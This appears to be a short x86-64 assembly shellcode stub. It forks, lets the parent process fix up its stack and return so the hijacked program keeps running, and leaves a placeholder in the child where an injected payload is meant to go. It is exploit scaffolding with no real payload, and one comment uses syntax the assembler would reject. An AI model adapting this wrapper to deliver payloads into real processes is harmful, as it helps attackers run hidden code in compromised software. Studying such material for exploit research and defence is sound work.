; compile with nasm -f bin -o shellcode shellcode.S
bits 64

    push rax
    ; fork syscall
    mov rax, 57     ; sys_fork
    syscall
    ; are we in the child?
    cmp rax,0
    je child
parent:
    pop rax
    mov rsp, rbp
    sub rsp, 344
    ret
child:
    dd 0xdecafbad // placeholder -> replace with actual payload
    ; exit(0)
    mov rax, 60
    mov rdi, 0
    syscall

